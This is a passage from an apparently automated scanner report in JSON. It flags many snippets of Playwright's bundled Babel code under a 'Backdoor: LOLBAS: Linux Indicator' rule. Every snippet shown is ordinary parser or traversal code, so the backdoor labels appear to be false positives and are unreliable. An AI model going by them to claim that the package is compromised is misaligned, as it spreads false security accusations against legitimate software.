                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1980,
                  "startColumn": 3444,
                  "endLine": 1980,
                  "endColumn": 3450,
                  "snippet": {
                    "text": "ts must start with \"./\"':\"\"}`):`Invalid \"${n?\"imports\":\"exports\"}\" target ${JSON.stringify(r)} defined for '${t}' in the package config ${e}package.json${s?` imported from ${s}`:\"\"}${i?'; targets must start with \"./\"':\"\"}`},Error);or.ERR_MODULE_NOT_FOUND=cn(\"ERR_MODULE_NOT_FOUND\",(e,t,r=!1)=>`Cannot find ${r?\"module\":\"package\"} '${e}' imported from ${t}`,Error);or.ERR_NETWORK_IMPORT_DISALLOWED=cn(\"ERR_NETWORK_IMPORT_DISALLOWED\",\"import of '%s' by %s is not supported: %s\",Error);or.ERR_PACKAGE_IMPORT_NOT_DEFINED=cn(\"ERR_PACKAGE_IMPORT_NOT_DEFINED\",(e,t,r)=>`Package import specifier \"${e}\" is not defi",
                    "rendered": {
                      "text": "ts must start with \"./\"':\"\"}`):`Invalid \"${n?\"imports\":\"exports\"}\" target ${JSON.stringify(r)} defined for '${t}' in the package config ${e}package.json${s?` imported from ${s}`:\"\"}${i?'; targets must start with \"./\"':\"\"}`},Error);or.ERR_MODULE_NOT_FOUND=cn(\"ERR_MODULE_NOT_FOUND\",(e,t,r=!1)=>`Cannot find ${r?\"module\":\"package\"} '${e}' imported from ${t}`,Error);or.ERR_NETWORK_IMPORT_DISALLOWED=cn(\"ERR_NETWORK_IMPORT_DISALLOWED\",\"import of '%s' by %s is not supported: %s\",Error);or.ERR_PACKAGE_IMPORT_NOT_DEFINED=cn(\"ERR_PACKAGE_IMPORT_NOT_DEFINED\",(e,t,r)=>`Package import specifier \"${e}\" is not defi",
                      "markdown": "`ts must start with \"./\"':\"\"}`):`Invalid \"${n?\"imports\":\"exports\"}\" target ${JSON.stringify(r)} defined for '${t}' in the package config ${e}package.json${s?` imported from ${s}`:\"\"}${i?'; targets must start with \"./\"':\"\"}`},Error);or.ERR_MODULE_NOT_FOUND=cn(\"ERR_MODULE_NOT_FOUND\",(e,t,r=!1)=>`Cannot find ${r?\"module\":\"package\"} '${e}' imported from ${t}`,Error);or.ERR_NETWORK_IMPORT_DISALLOWED=cn(\"ERR_NETWORK_IMPORT_DISALLOWED\",\"import of '%s' by %s is not supported: %s\",Error);or.ERR_PACKAGE_IMPORT_NOT_DEFINED=cn(\"ERR_PACKAGE_IMPORT_NOT_DEFINED\",(e,t,r)=>`Package import specifier \"${e}\" is not defi`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1968,
                  "startColumn": 64,
                  "endLine": 1968,
                  "endColumn": 70,
                  "snippet": {
                    "text": "  // any possible NODE_ENV value that might come up during plugin execution.\n  var isProd = api.cache(() => process.env.NODE_ENV === \"production\");\n\n  // .cache(fn) will perform a linear search though instances to find the matching plugin based\n  // based on previous instantiated plugins. If you want to recreate the plugin and discard the\n  // previous instance whenever something changes, you may use:\n  var isProd = api.cache.invalidate(() => process.env.NODE_ENV === \"production\");\n",
                    "rendered": {
                      "text": "  // any possible NODE_ENV value that might come up during plugin execution.\n  var isProd = api.cache(() => process.env.NODE_ENV === \"production\");\n\n  // .cache(fn) will perform a linear search though instances to find the matching plugin based\n  // based on previous instantiated plugins. If you want to recreate the plugin and discard the\n  // previous instance whenever something changes, you may use:\n  var isProd = api.cache.invalidate(() => process.env.NODE_ENV === \"production\");\n",
                      "markdown": "`  // any possible NODE_ENV value that might come up during plugin execution.\n  var isProd = api.cache(() => process.env.NODE_ENV === \"production\");\n\n  // .cache(fn) will perform a linear search though instances to find the matching plugin based\n  // based on previous instantiated plugins. If you want to recreate the plugin and discard the\n  // previous instance whenever something changes, you may use:\n  var isProd = api.cache.invalidate(() => process.env.NODE_ENV === \"production\");\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1962,
                  "startColumn": 5,
                  "endLine": 1962,
                  "endColumn": 10,
                  "snippet": {
                    "text": "\n  // Cached based on the value of some function. If this function returns a value different from\n  // a previously-encountered value, the plugins will re-evaluate.\n  var env = api.cache(() => process.env.NODE_ENV);\n\n  // If testing for a specific env, we recommend specifics to avoid instantiating a plugin for\n  // any possible NODE_ENV value that might come up during plugin execution.\n",
                    "rendered": {
                      "text": "\n  // Cached based on the value of some function. If this function returns a value different from\n  // a previously-encountered value, the plugins will re-evaluate.\n  var env = api.cache(() => process.env.NODE_ENV);\n\n  // If testing for a specific env, we recommend specifics to avoid instantiating a plugin for\n  // any possible NODE_ENV value that might come up during plugin execution.\n",
                      "markdown": "`\n  // Cached based on the value of some function. If this function returns a value different from\n  // a previously-encountered value, the plugins will re-evaluate.\n  var env = api.cache(() => process.env.NODE_ENV);\n\n  // If testing for a specific env, we recommend specifics to avoid instantiating a plugin for\n  // any possible NODE_ENV value that might come up during plugin execution.\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1726,
                  "startColumn": 1556,
                  "endLine": 1726,
                  "endColumn": 1562,
                  "snippet": {
                    "text": "nstanceof pt||(t=new pt),t.tail=null,t.head=null,t.length=0,e&&typeof e.forEach==\"function\")e.forEach(function(s){t.push(s)});else if(arguments.length>0)for(var r=0,n=arguments.length;r<n;r++)t.push(arguments[r]);return t}pt.prototype.removeNode=function(e){if(e.list!==this)throw new Error(\"removing node which does not belong to this list\");var t=e.next,r=e.prev;return t&&(t.prev=r),r&&(r.next=t),e===this.head&&(this.head=t),e===this.tail&&(this.tail=r),e.list.length--,e.next=null,e.prev=null,e.list=null,t};pt.prototype.unshiftNode=function(e){if(e!==this.head){e.list&&e.list.removeNode(e);var t=thi",
                    "rendered": {
                      "text": "nstanceof pt||(t=new pt),t.tail=null,t.head=null,t.length=0,e&&typeof e.forEach==\"function\")e.forEach(function(s){t.push(s)});else if(arguments.length>0)for(var r=0,n=arguments.length;r<n;r++)t.push(arguments[r]);return t}pt.prototype.removeNode=function(e){if(e.list!==this)throw new Error(\"removing node which does not belong to this list\");var t=e.next,r=e.prev;return t&&(t.prev=r),r&&(r.next=t),e===this.head&&(this.head=t),e===this.tail&&(this.tail=r),e.list.length--,e.next=null,e.prev=null,e.list=null,t};pt.prototype.unshiftNode=function(e){if(e!==this.head){e.list&&e.list.removeNode(e);var t=thi",
                      "markdown": "`nstanceof pt||(t=new pt),t.tail=null,t.head=null,t.length=0,e&&typeof e.forEach==\"function\")e.forEach(function(s){t.push(s)});else if(arguments.length>0)for(var r=0,n=arguments.length;r<n;r++)t.push(arguments[r]);return t}pt.prototype.removeNode=function(e){if(e.list!==this)throw new Error(\"removing node which does not belong to this list\");var t=e.next,r=e.prev;return t&&(t.prev=r),r&&(r.next=t),e===this.head&&(this.head=t),e===this.tail&&(this.tail=r),e.list.length--,e.next=null,e.prev=null,e.list=null,t};pt.prototype.unshiftNode=function(e){if(e!==this.head){e.list&&e.list.removeNode(e);var t=thi`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 41291,
                  "endLine": 66,
                  "endColumn": 41297,
                  "snippet": {
                    "text": "dm(),Yce=SC(),{VISITOR_KEYS:Xce,removeProperties:Jce,traverseFast:PC}=Wce;function qr(e,t={},r,n,s,i){if(e){if(!t.noScope&&!r&&e.type!==\"Program\"&&e.type!==\"File\")throw new Error(`You must pass a scope and parentPath unless traversing a Program/File. Instead of that you tried to traverse a ${e.type} node without passing scope and parentPath.`);if(!s&&i)throw new Error(\"visitSelf can only be used when providing a NodePath.\");Xce[e.type]&&(ko.explode(t),(0,xC.traverseNode)(e,t,r,n,s,null,i))}}var Q2e=Mn.default=qr;qr.visitors=ko;qr.verify=ko.verify;qr.explode=ko.explode;qr.cheap=function(e,t){PC(e,t)}",
                    "rendered": {
                      "text": "dm(),Yce=SC(),{VISITOR_KEYS:Xce,removeProperties:Jce,traverseFast:PC}=Wce;function qr(e,t={},r,n,s,i){if(e){if(!t.noScope&&!r&&e.type!==\"Program\"&&e.type!==\"File\")throw new Error(`You must pass a scope and parentPath unless traversing a Program/File. Instead of that you tried to traverse a ${e.type} node without passing scope and parentPath.`);if(!s&&i)throw new Error(\"visitSelf can only be used when providing a NodePath.\");Xce[e.type]&&(ko.explode(t),(0,xC.traverseNode)(e,t,r,n,s,null,i))}}var Q2e=Mn.default=qr;qr.visitors=ko;qr.verify=ko.verify;qr.explode=ko.explode;qr.cheap=function(e,t){PC(e,t)}",
                      "markdown": "`dm(),Yce=SC(),{VISITOR_KEYS:Xce,removeProperties:Jce,traverseFast:PC}=Wce;function qr(e,t={},r,n,s,i){if(e){if(!t.noScope&&!r&&e.type!==\"Program\"&&e.type!==\"File\")throw new Error(`You must pass a scope and parentPath unless traversing a Program/File. Instead of that you tried to traverse a ${e.type} node without passing scope and parentPath.`);if(!s&&i)throw new Error(\"visitSelf can only be used when providing a NodePath.\");Xce[e.type]&&(ko.explode(t),(0,xC.traverseNode)(e,t,r,n,s,null,i))}}var Q2e=Mn.default=qr;qr.visitors=ko;qr.verify=ko.verify;qr.explode=ko.explode;qr.cheap=function(e,t){PC(e,t)}`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 38299,
                  "endLine": 66,
                  "endColumn": 38305,
                  "snippet": {
                    "text": ",_ce,Nce,kce,Bce);Ss.prototype._guessExecutionStatusRelativeToDifferentFunctions=vC._guessExecutionStatusRelativeTo;for(let e of ic.TYPES){let t=`is${e}`,r=ic[t];Ss.prototype[t]=function(n){return r(this.node,n)},Ss.prototype[`assert${e}`]=function(n){if(!r(this.node,n))throw new TypeError(`Expected node path of type ${e}`)}}Object.assign(Ss.prototype,Fce);for(let e of Object.keys(Ece))e[0]!==\"_\"&&(ic.TYPES.includes(e)||ic.TYPES.push(e));var H2e=bn.default=Ss});var TC=E(ac=>{\"use strict\";Object.defineProperty(ac,\"__esModule\",{value:!0});ac.default=void 0;var Lce=vs(),Mce=De(),{VISITOR_KEYS:Rce}=Mce,",
                    "rendered": {
                      "text": ",_ce,Nce,kce,Bce);Ss.prototype._guessExecutionStatusRelativeToDifferentFunctions=vC._guessExecutionStatusRelativeTo;for(let e of ic.TYPES){let t=`is${e}`,r=ic[t];Ss.prototype[t]=function(n){return r(this.node,n)},Ss.prototype[`assert${e}`]=function(n){if(!r(this.node,n))throw new TypeError(`Expected node path of type ${e}`)}}Object.assign(Ss.prototype,Fce);for(let e of Object.keys(Ece))e[0]!==\"_\"&&(ic.TYPES.includes(e)||ic.TYPES.push(e));var H2e=bn.default=Ss});var TC=E(ac=>{\"use strict\";Object.defineProperty(ac,\"__esModule\",{value:!0});ac.default=void 0;var Lce=vs(),Mce=De(),{VISITOR_KEYS:Rce}=Mce,",
                      "markdown": "`,_ce,Nce,kce,Bce);Ss.prototype._guessExecutionStatusRelativeToDifferentFunctions=vC._guessExecutionStatusRelativeTo;for(let e of ic.TYPES){let t=`is${e}`,r=ic[t];Ss.prototype[t]=function(n){return r(this.node,n)},Ss.prototype[`assert${e}`]=function(n){if(!r(this.node,n))throw new TypeError(`Expected node path of type ${e}`)}}Object.assign(Ss.prototype,Fce);for(let e of Object.keys(Ece))e[0]!==\"_\"&&(ic.TYPES.includes(e)||ic.TYPES.push(e));var H2e=bn.default=Ss});var TC=E(ac=>{\"use strict\";Object.defineProperty(ac,\"__esModule\",{value:!0});ac.default=void 0;var Lce=vs(),Mce=De(),{VISITOR_KEYS:Rce}=Mce,`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 36573,
                  "endLine": 66,
                  "endColumn": 36579,
                  "snippet": {
                    "text": "null,this.parentPath=null,this.container=null,this.listKey=null,this.key=null,this.node=null,this.type=null,this.parent=r,this.hub=t,this.data=null,this.context=null,this.scope=null}static get({hub:t,parentPath:r,parent:n,container:s,listKey:i,key:a}){if(!t&&r&&(t=r.hub),!n)throw new Error(\"To get a node path the parent needs to exist\");let o=s[a],l=xce.getOrCreateCachedPaths(t,n),u=l.get(o);return u||(u=new e(t,n),o&&l.set(o,u)),u.setup(r,s,i,a),u}getScope(t){return this.isScope()?new Sce.default(this):t}setData(t,r){return this.data==null&&(this.data=Object.create(null)),this.data[t]=r}getData(t,r",
                    "rendered": {
                      "text": "null,this.parentPath=null,this.container=null,this.listKey=null,this.key=null,this.node=null,this.type=null,this.parent=r,this.hub=t,this.data=null,this.context=null,this.scope=null}static get({hub:t,parentPath:r,parent:n,container:s,listKey:i,key:a}){if(!t&&r&&(t=r.hub),!n)throw new Error(\"To get a node path the parent needs to exist\");let o=s[a],l=xce.getOrCreateCachedPaths(t,n),u=l.get(o);return u||(u=new e(t,n),o&&l.set(o,u)),u.setup(r,s,i,a),u}getScope(t){return this.isScope()?new Sce.default(this):t}setData(t,r){return this.data==null&&(this.data=Object.create(null)),this.data[t]=r}getData(t,r",
                      "markdown": "`null,this.parentPath=null,this.container=null,this.listKey=null,this.key=null,this.node=null,this.type=null,this.parent=r,this.hub=t,this.data=null,this.context=null,this.scope=null}static get({hub:t,parentPath:r,parent:n,container:s,listKey:i,key:a}){if(!t&&r&&(t=r.hub),!n)throw new Error(\"To get a node path the parent needs to exist\");let o=s[a],l=xce.getOrCreateCachedPaths(t,n),u=l.get(o);return u||(u=new e(t,n),o&&l.set(o,u)),u.setup(r,s,i,a),u}getScope(t){return this.isScope()?new Sce.default(this):t}setData(t,r){return this.data==null&&(this.data=Object.create(null)),this.data[t]=r}getData(t,r`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 29422,
                  "endLine": 66,
                  "endColumn": 29428,
                  "snippet": {
                    "text": "lse{if(Array.isArray(this.container))return this._containerInsertAfter(t);if(this.isStatementOrBlock()){let s=this.node,i=s&&(!this.isExpressionStatement()||s.expression!=null);return this.replaceWith(lC(i?[s]:[])),this.pushContainer(\"body\",t)}else throw new Error(\"We don't know what to do with this node type. We were previously a Statement but we can't fit in here?\")}}function Rue(e,t){if(!this.parent)return;let r=(0,Eue.getCachedPaths)(this.hub,this.parent)||[];for(let[,n]of r)typeof n.key==\"number\"&&n.key>=e&&(n.key+=t)}function que(e){if(!e)return[];Array.isArray(e)||(e=[e]);for(let t=0;t<e.leng",
                    "rendered": {
                      "text": "lse{if(Array.isArray(this.container))return this._containerInsertAfter(t);if(this.isStatementOrBlock()){let s=this.node,i=s&&(!this.isExpressionStatement()||s.expression!=null);return this.replaceWith(lC(i?[s]:[])),this.pushContainer(\"body\",t)}else throw new Error(\"We don't know what to do with this node type. We were previously a Statement but we can't fit in here?\")}}function Rue(e,t){if(!this.parent)return;let r=(0,Eue.getCachedPaths)(this.hub,this.parent)||[];for(let[,n]of r)typeof n.key==\"number\"&&n.key>=e&&(n.key+=t)}function que(e){if(!e)return[];Array.isArray(e)||(e=[e]);for(let t=0;t<e.leng",
                      "markdown": "`lse{if(Array.isArray(this.container))return this._containerInsertAfter(t);if(this.isStatementOrBlock()){let s=this.node,i=s&&(!this.isExpressionStatement()||s.expression!=null);return this.replaceWith(lC(i?[s]:[])),this.pushContainer(\"body\",t)}else throw new Error(\"We don't know what to do with this node type. We were previously a Statement but we can't fit in here?\")}}function Rue(e,t){if(!this.parent)return;let r=(0,Eue.getCachedPaths)(this.hub,this.parent)||[];for(let[,n]of r)typeof n.key==\"number\"&&n.key>=e&&(n.key+=t)}function que(e){if(!e)return[];Array.isArray(e)||(e=[e]);for(let t=0;t<e.leng`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 27322,
                  "endLine": 66,
                  "endColumn": 27328,
                  "snippet": {
                    "text": "if(Array.isArray(this.container))return this._containerInsertBefore(t);if(this.isStatementOrBlock()){let s=this.node,i=s&&(!this.isExpressionStatement()||s.expression!=null);return this.replaceWith(lC(i?[s]:[])),this.unshiftContainer(\"body\",t)}else throw new Error(\"We don't know what to do with this node type. We were previously a Statement but we can't fit in here?\")}function Bue(e,t){this.updateSiblingKeys(e,t.length);let r=[];this.container.splice(e,0,...t);for(let i=0;i<t.length;i++){var n;let a=e+i,o=this.getSibling(a);r.push(o),(n=this.context)!=null&&n.queue&&o.pushContext(this.context)}let s",
                    "rendered": {
                      "text": "if(Array.isArray(this.container))return this._containerInsertBefore(t);if(this.isStatementOrBlock()){let s=this.node,i=s&&(!this.isExpressionStatement()||s.expression!=null);return this.replaceWith(lC(i?[s]:[])),this.unshiftContainer(\"body\",t)}else throw new Error(\"We don't know what to do with this node type. We were previously a Statement but we can't fit in here?\")}function Bue(e,t){this.updateSiblingKeys(e,t.length);let r=[];this.container.splice(e,0,...t);for(let i=0;i<t.length;i++){var n;let a=e+i,o=this.getSibling(a);r.push(o),(n=this.context)!=null&&n.queue&&o.pushContext(this.context)}let s",
                      "markdown": "`if(Array.isArray(this.container))return this._containerInsertBefore(t);if(this.isStatementOrBlock()){let s=this.node,i=s&&(!this.isExpressionStatement()||s.expression!=null);return this.replaceWith(lC(i?[s]:[])),this.unshiftContainer(\"body\",t)}else throw new Error(\"We don't know what to do with this node type. We were previously a Statement but we can't fit in here?\")}function Bue(e,t){this.updateSiblingKeys(e,t.length);let r=[];this.container.splice(e,0,...t);for(let i=0;i<t.length;i++){var n;let a=e+i,o=this.getSibling(a);r.push(o),(n=this.context)!=null&&n.queue&&o.pushContext(this.context)}let s`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 2569,
                  "endLine": 66,
                  "endColumn": 2575,
                  "snippet": {
                    "text": "operty()||this.isMethod())e=this.node.key;else throw new ReferenceError(\"todo\");return this.node.computed||koe(e)&&(e=WA(e.name)),e}function Hoe(){let e=this.get(\"body\"),t=e.node;if(Array.isArray(e))throw new Error(\"Can't convert array path to a block statement\");if(!t)throw new Error(\"Can't convert node without a body\");if(e.isBlockStatement())return t;let r=[],n=\"body\",s,i;e.isStatement()?(i=\"body\",s=0,r.push(e.node)):(n+=\".body.0\",this.isFunction()?(s=\"argument\",r.push(Uoe(e.node))):(s=\"expression\",r.push($A(e.node)))),this.node.body=_oe(r);let a=this.get(n);return e.setup(a,i?a.node[i]:a.node,i,",
                    "rendered": {
                      "text": "operty()||this.isMethod())e=this.node.key;else throw new ReferenceError(\"todo\");return this.node.computed||koe(e)&&(e=WA(e.name)),e}function Hoe(){let e=this.get(\"body\"),t=e.node;if(Array.isArray(e))throw new Error(\"Can't convert array path to a block statement\");if(!t)throw new Error(\"Can't convert node without a body\");if(e.isBlockStatement())return t;let r=[],n=\"body\",s,i;e.isStatement()?(i=\"body\",s=0,r.push(e.node)):(n+=\".body.0\",this.isFunction()?(s=\"argument\",r.push(Uoe(e.node))):(s=\"expression\",r.push($A(e.node)))),this.node.body=_oe(r);let a=this.get(n);return e.setup(a,i?a.node[i]:a.node,i,",
                      "markdown": "`operty()||this.isMethod())e=this.node.key;else throw new ReferenceError(\"todo\");return this.node.computed||koe(e)&&(e=WA(e.name)),e}function Hoe(){let e=this.get(\"body\"),t=e.node;if(Array.isArray(e))throw new Error(\"Can't convert array path to a block statement\");if(!t)throw new Error(\"Can't convert node without a body\");if(e.isBlockStatement())return t;let r=[],n=\"body\",s,i;e.isStatement()?(i=\"body\",s=0,r.push(e.node)):(n+=\".body.0\",this.isFunction()?(s=\"argument\",r.push(Uoe(e.node))):(s=\"expression\",r.push($A(e.node)))),this.node.body=_oe(r);let a=this.get(n);return e.setup(a,i?a.node[i]:a.node,i,`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 31,
                  "startColumn": 571,
                  "endLine": 31,
                  "endColumn": 577,
                  "snippet": {
                    "text": "n't replace this node, we've already removed it\");let t=e instanceof Nie.default?e.node:e;if(!t)throw new Error(\"You passed `path.replaceWith()` a falsy node, use `path.remove()` instead\");if(this.node===t)return[this];if(this.isProgram()&&!Jie(t))throw new Error(\"You can only replace a Program root node with another Program node\");if(Array.isArray(t))throw new Error(\"Don't use `path.replaceWith()` with an array of nodes, use `path.replaceWithMultiple()`\");if(typeof t==\"string\")throw new Error(\"Don't use `path.replaceWith()` with a source string, use `path.replaceWithSourceString()`\");let r=\"\";if(th",
                    "rendered": {
                      "text": "n't replace this node, we've already removed it\");let t=e instanceof Nie.default?e.node:e;if(!t)throw new Error(\"You passed `path.replaceWith()` a falsy node, use `path.remove()` instead\");if(this.node===t)return[this];if(this.isProgram()&&!Jie(t))throw new Error(\"You can only replace a Program root node with another Program node\");if(Array.isArray(t))throw new Error(\"Don't use `path.replaceWith()` with an array of nodes, use `path.replaceWithMultiple()`\");if(typeof t==\"string\")throw new Error(\"Don't use `path.replaceWith()` with a source string, use `path.replaceWithSourceString()`\");let r=\"\";if(th",
                      "markdown": "`n't replace this node, we've already removed it\");let t=e instanceof Nie.default?e.node:e;if(!t)throw new Error(\"You passed `path.replaceWith()` a falsy node, use `path.remove()` instead\");if(this.node===t)return[this];if(this.isProgram()&&!Jie(t))throw new Error(\"You can only replace a Program root node with another Program node\");if(Array.isArray(t))throw new Error(\"Don't use `path.replaceWith()` with an array of nodes, use `path.replaceWithMultiple()`\");if(typeof t==\"string\")throw new Error(\"Don't use `path.replaceWith()` with a source string, use `path.replaceWithSourceString()`\");let r=\"\";if(th`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 29,
                  "startColumn": 20968,
                  "endLine": 29,
                  "endColumn": 20976,
                  "snippet": {
                    "text": " a named import when 'import type' is used on its import statement.\",UnexpectedParameterModifier:\"A parameter property is only allowed in a constructor implementation.\",UnexpectedReadonly:\"'readonly' type modifier is only permitted on array and tuple literal types.\",UnexpectedTypeAnnotation:\"Did not expect a type annotation here.\",UnexpectedTypeCastInParameter:\"Unexpected type cast in parameter position.\",UnsupportedImportTypeArgument:\"Argument in a type import must be a string literal.\",UnsupportedParameterPropertyKind:\"A parameter property may not be declared using a binding pattern.\",UnsupportedSig",
                    "rendered": {
                      "text": " a named import when 'import type' is used on its import statement.\",UnexpectedParameterModifier:\"A parameter property is only allowed in a constructor implementation.\",UnexpectedReadonly:\"'readonly' type modifier is only permitted on array and tuple literal types.\",UnexpectedTypeAnnotation:\"Did not expect a type annotation here.\",UnexpectedTypeCastInParameter:\"Unexpected type cast in parameter position.\",UnsupportedImportTypeArgument:\"Argument in a type import must be a string literal.\",UnsupportedParameterPropertyKind:\"A parameter property may not be declared using a binding pattern.\",UnsupportedSig",
                      "markdown": "` a named import when 'import type' is used on its import statement.\",UnexpectedParameterModifier:\"A parameter property is only allowed in a constructor implementation.\",UnexpectedReadonly:\"'readonly' type modifier is only permitted on array and tuple literal types.\",UnexpectedTypeAnnotation:\"Did not expect a type annotation here.\",UnexpectedTypeCastInParameter:\"Unexpected type cast in parameter position.\",UnsupportedImportTypeArgument:\"Argument in a type import must be a string literal.\",UnsupportedParameterPropertyKind:\"A parameter property may not be declared using a binding pattern.\",UnsupportedSig`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 25,
                  "startColumn": 10845,
                  "endLine": 25,
                  "endColumn": 10851,
                  "snippet": {
                    "text": "type:e})}; please wrap it in parentheses.`,PipelineBodyNoArrow:'Unexpected arrow \"=>\" after pipeline body; arrow function in pipeline body must be parenthesized.',PipelineBodySequenceExpression:\"Pipeline body may not be a comma-separated sequence expression.\",PipelineHeadSequenceExpression:\"Pipeline head should not be a comma-separated sequence expression.\",PipelineTopicUnused:\"Pipeline is in topic style but does not use topic reference.\",PrimaryTopicNotAllowed:\"Topic reference was used in a lexical context without topic binding.\",PrimaryTopicRequiresSmartPipeline:'Topic reference is used, but the p",
                    "rendered": {
                      "text": "type:e})}; please wrap it in parentheses.`,PipelineBodyNoArrow:'Unexpected arrow \"=>\" after pipeline body; arrow function in pipeline body must be parenthesized.',PipelineBodySequenceExpression:\"Pipeline body may not be a comma-separated sequence expression.\",PipelineHeadSequenceExpression:\"Pipeline head should not be a comma-separated sequence expression.\",PipelineTopicUnused:\"Pipeline is in topic style but does not use topic reference.\",PrimaryTopicNotAllowed:\"Topic reference was used in a lexical context without topic binding.\",PrimaryTopicRequiresSmartPipeline:'Topic reference is used, but the p",
